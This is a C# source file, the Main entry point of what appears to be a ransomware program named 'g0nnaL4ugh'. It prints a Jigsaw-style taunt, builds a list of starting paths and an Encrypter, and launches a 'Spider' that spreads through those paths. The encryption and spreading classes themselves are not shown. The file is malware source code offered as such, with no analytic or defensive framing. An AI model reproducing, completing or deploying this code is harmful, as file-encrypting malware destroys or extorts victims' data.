using System;
using g0nnaL4ugh.Crypto;

namespace g0nnaL4ugh
{
    class Program
    {
        public static void Main(string[] args)
        {
            Console.WriteLine("Wann4 play a G4m3?");
            PathUtil pathUtil = new PathUtil();
#if DEBUG
            Console.WriteLine("Starting spread in paths:");
            foreach(string path in pathUtil.Start)
            {
                Console.WriteLine("\t" + path);
            }
#endif
            Spider spider;
            Encrypter encrypter = new Encrypter();
            spider = new Spider(pathUtil, encrypter);
            spider.Spread();
        }
    }
}
